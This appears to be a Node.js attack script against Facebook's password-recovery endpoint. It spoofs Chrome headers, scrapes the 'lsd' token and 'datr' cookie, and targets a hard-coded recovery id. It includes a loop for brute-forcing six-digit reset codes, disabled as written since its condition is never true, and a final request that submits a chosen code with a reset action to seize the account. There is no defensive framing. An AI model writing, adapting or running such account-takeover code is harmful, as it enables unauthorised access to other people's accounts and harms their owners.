'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand, randomString, parseHeaders } = helpers;

const httpClient = new Http2Client(true);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  function getTokens() {
    return new Promise(r => {
      const headers = {
        host: 'www.facebook.com',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Ch-Ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'fr',
        Priority: 'u=0, i'
      };
      httpClient.get('https://web.facebook.com/?_rdc=1&_rdr', headers).then(res => {
        const { statusCode, headers } = res;
        if (200 !== statusCode) {
          throw new Error('getDatr: http('+statusCode+')');
        }
        const cookies = headers['set-cookie'];
        let match = new RegExp(/<input type="hidden" name="lsd" value="([a-zA-Z0-9-_]+)"/).exec(res.data);

        const tokens = { lsd: match[1] };

        for (let i = 0, cookie, match; cookies.length > i; ++i) {
          cookie = cookies[i];
          match = new RegExp(/datr=([a-zA-Z0-9-_]+)/).exec(cookie);
          if (match) {
            tokens.datr = match[1];
            r(tokens);
            break;
          }
        }

      });
    });
  }

  const { lsd, datr } = await getTokens();
  log('tokens ok');
  const cuid = 'AYha5WOAtPsydTVWOe9EJNgfbWbZFzf4tYSNAAM7bKecdaKgTdtBrVu8C7qu-ZfpVqnFQ9GCeEqhm9PLV4voOm3-vgsOvMR88TYjFqZOQNBsID-3V4CLodCYZYzRcnbQf0uBLvHDJvabQOcVK5zwYJKGk7_9K_JBzcELjGWLk4WyPEYJsG-EjjOoEz78LG1Fi_tBOD9b0ESCbWuDtgELBKKq';
  const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr='+datr,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    // httpClient.post(url, headers, 'jazoest=11111&lsd='+lsd+'&n='+910984+'&reset_action=1').then(res => log(res.statusCode));
    httpClient.post(url, headers, 'jazoest=11111&lsd='+lsd+'&n='+910983+'&reset_action=1').then(res => log(res.statusCode));
  });
})();